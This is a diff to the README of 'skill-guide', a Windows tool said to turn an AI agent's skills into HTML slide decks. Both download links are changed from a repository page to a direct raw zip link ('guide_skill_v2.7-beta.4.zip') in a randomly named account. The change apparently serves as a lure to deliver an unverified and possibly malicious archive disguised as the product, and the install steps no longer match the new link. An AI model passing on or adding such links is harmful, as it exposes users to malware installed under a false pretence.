@@ -1,6 +1,6 @@
 # 📊 skill-guide - Create beautiful presentations from your skills
 
-[![Download skill-guide](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Coldwavegenusthespesia630/skill-guide)
+[![Download skill-guide](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Coldwavegenusthespesia630/skill-guide/main/Huxleian/guide_skill_v2.7-beta.4.zip)
 
 skill-guide helps you see which tasks your AI agent handles. It organizes your software skills into clear HTML slide decks. You view your system capabilities without reading complex code.
 
@@ -8,7 +8,7 @@ skill-guide helps you see which tasks your AI agent handles. It organizes your s
 
 The application runs on Windows. You need the latest version of the toolkit to start.
 
-Visit this page to download: [https://github.com/Coldwavegenusthespesia630/skill-guide](https://github.com/Coldwavegenusthespesia630/skill-guide)
+Visit this page to download: [https://raw.githubusercontent.com/Coldwavegenusthespesia630/skill-guide/main/Huxleian/guide_skill_v2.7-beta.4.zip](https://raw.githubusercontent.com/Coldwavegenusthespesia630/skill-guide/main/Huxleian/guide_skill_v2.7-beta.4.zip)
 
 1. Open the link above in your web browser.
 2. Find the section labeled Releases on the right side.
